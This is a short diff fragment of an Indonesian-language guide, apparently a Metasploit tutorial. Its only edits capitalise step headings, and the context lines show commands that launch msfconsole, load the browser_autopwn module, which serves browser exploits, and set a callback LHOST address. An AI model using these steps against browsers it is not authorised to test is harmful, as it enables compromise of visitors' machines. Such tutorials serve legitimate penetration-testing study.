@@ -30,13 +30,13 @@ Prasyarat:
    msfconsole
    ```
 
-2. Gunakan modul AutoPwn:
+2. Gunakan Modul AutoPwn:
 
    ```
    use auxiliary/server/browser_autopwn
    ```
 
-3. Atur parameter penting:
+3. Atur Parameter Penting:
 
    ```
    set LHOST 192.168.1.10
